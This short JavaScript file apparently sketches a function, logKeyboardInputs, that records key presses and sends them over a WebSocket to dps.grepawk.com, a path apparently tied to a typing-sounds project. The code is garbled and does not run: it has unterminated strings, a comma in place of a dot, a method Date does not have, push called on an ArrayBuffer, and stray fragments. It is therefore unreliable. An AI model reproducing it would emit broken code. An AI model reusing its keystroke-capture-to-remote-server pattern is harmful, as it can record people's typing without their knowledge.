
let buffer = ArrayBuffer(1024);
const today = new Date();
const filename = [today.getDate(), today.getHour(), today,getMinute(), today.getSecond()].join("-");
const container = "sounds";





export const logKeyboardInputs = () => {
    window.onkeydown( (e, connection)=>{
        
        const socket = socket || initiatmg ===false && new WebSocket("ws://dps.grepawk.com=/stdin/sounds/yishengtyping.txt);
        buffer.push({e.keyCode, type:type, e.time, });
        
    })
    window.

  const socket = new WebSocket("ws://dps.grepawk.com=/stdin/sounds/yishengtyping.txt);
    console.log(socket);
    console.socket.onkeydown(e){

    }
  // Connection opened
  socket.addEventListener("open", function (event) {
    socket.send("Hello Server!");
  });

  // Listen for messages
  socket.addEventListener("message", function (event) {
    console.log("Message from server ", event.data);
  });
};